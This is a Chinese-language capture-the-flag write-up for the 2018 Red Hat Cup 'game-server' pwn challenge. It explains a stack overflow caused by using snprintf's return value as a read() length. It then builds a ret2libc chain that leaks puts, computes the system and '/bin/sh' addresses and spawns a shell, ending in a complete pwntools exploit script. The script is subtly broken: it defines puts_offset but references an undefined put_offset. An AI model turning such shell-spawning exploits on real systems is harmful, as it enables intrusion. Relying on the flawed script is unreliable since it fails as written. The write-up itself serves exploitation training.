# 2018红帽杯--pwn--game-server

checksec

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

```

32位程序，只开启nx，很明显就是ret2libc

ida打开

```c++
int sub_8048637()
{
  char s; // [sp+7h] [bp-111h]@5
  char v2; // [sp+107h] [bp-11h]@5
  size_t nbytes; // [sp+108h] [bp-10h]@5
  char *v4; // [sp+10Ch] [bp-Ch]@1

  puts("Welcome to my game server");
  puts("First, you need to tell me you name?");
  fgets(yourname, 0x100, stdin);
  v4 = strrchr(yourname, 10);
  if ( v4 )
    *v4 = 0;
  printf("Hello %s\n", yourname);
  puts("What's you occupation?");
  fgets(youroccupation, 0x100, stdin);
  v4 = strrchr(youroccupation, 10);
  if ( v4 )
    *v4 = 0;
  printf("Well, my noble %s\n", youroccupation);
  nbytes = snprintf(
             &s,
             0x100u,
             "Our %s is a noble %s. He is come from north and well change out would.",
             yourname,
             youroccupation);
  puts("Here is you introduce");
  puts(&s);
  puts("Do you want to edit you introduce by yourself?[Y/N]");
  v2 = getchar();			
  getchar();
  if ( v2 == 89 )
    read(0, &s, nbytes);	//可溢出之处
  return printf("name : %s\noccupation : %s\nintroduce : %s\n", yourname, youroccupation, &s);
}
```

输入名字和职业，然后生成介绍，再问你修不修改介绍

漏洞在snprintf 处

## snprintf

函数会把“our %s is 。。。。”和yourname,yourocc连接起来，第一个%s放yourname，第二个放yourocc，长度初始设为0x100。但实际长度如果超过0x100，最终长度会以实际为准，连接后的字符串放在&s处。返回长度放在nbytes。

## 利用思路

我们把name和occ的长度搞到很大，使得nbytes的值达到可溢出的数，求libc的偏移，得到system和'/bin/sh'的地址，getshell。

### 第一步  求偏移

我们看看栈

```c++
-00000111 s               db ?
-00000110                 db ? ; undefined
-0000010F                 db ? ; undefined
-0000010E                 db ? ; undefined
。。。。。。。。。。。。。。。。。。。。。。。。
-00000012                 db ? ; undefined
-00000011 var_11          db ?
-00000010 nbytes          dd ?
-0000000C var_C           dd ?
-00000008                 db ? ; undefined
-00000007                 db ? ; undefined
-00000006                 db ? ; undefined
-00000005                 db ? ; undefined
-00000004                 db ? ; undefined
-00000003                 db ? ; undefined
-00000002                 db ? ; undefined
-00000001                 db ? ; undefined
+00000000  s              db 4 dup(?)
+00000004  r              db 4 dup(?)
```

可见溢出长度应该在0x111+4 = 277

```
payload = 'a' * 277 + sys + fun + binsh
```

我们把name和occ的长度设为250

```
name = 'a' * 250

occ = 'a' * 250
```

因为题目没有给出libc文件，我们可以利用网站https://libc.blukat.me/

先把puts 和 printf的实际地址 利用puts_plt函数读出来，就可以知道offset了

## 第二步 求system和binsh的实际地址

利用公式

```
libc_addr = puts_addr - puts_offset
system_addr = system_offset + libc_addr
binsh_addr = binsh_offset + libc_addr
```

exp:

```
from pwn import *

r = process("./pwn2")
elf = ELF("./pwn2")
print util.proc.pidof(r)

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
puts_offset = 0x5f140

#printf_got = elf.got['printf']

function = 0x8048637
system_offset = 0x3a940
binsh_offset = 0x15902b

name = 'a'*250
occ = 'b'*250


r.recv()
r.sendline(name)
r.recv()
r.sendline(occ)
r.recv()
r.sendline('Y')
payload = 'a'*(0x111+4) + p32(puts_plt) + p32(function) + p32(puts_got)
r.sendline(payload)
r.recvuntil("\n\n")

put_addr = u32(r.recv(4))

success(hex(put_addr))
libc_addr = put_addr - put_offset
sys_addr = libc_addr + system_offset
binsh_addr = libc_addr + binsh_offset
payload = 'a'*(0x111+4) + p32(sys_addr) + p32(function) + p32(binsh_addr)
r.recv()
r.sendline(name)
r.recv()
r.sendline(occ)
r.recv()
r.sendline('Y')
r.sendline(payload)

r.interactive()



```

